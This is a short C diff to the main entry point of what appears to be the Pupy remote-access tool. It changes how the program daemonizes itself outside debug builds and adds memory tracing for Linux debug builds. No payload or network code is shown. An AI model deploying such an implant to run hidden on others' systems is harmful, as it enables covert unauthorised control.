@@ -1,10 +1,20 @@
+#include <sys/types.h>
+#include <unistd.h>
+
 #include "pupy_load.h"
 #include "daemonize.h"
 
-int main(int argc, char *argv[]) {
-#ifndef DEBUG
-    daemonize(true);
+#ifdef Linux
+#include <mcheck.h>
 #endif
 
-	return mainThread(argc, argv, false);
+int main(int argc, char *argv[], char *env[]) {
+#ifndef DEBUG
+    daemonize(argc, argv, env, true);
+#else
+#ifdef Linux
+    mtrace();
+#endif
+#endif
+    return mainThread(argc, argv, false);
 }
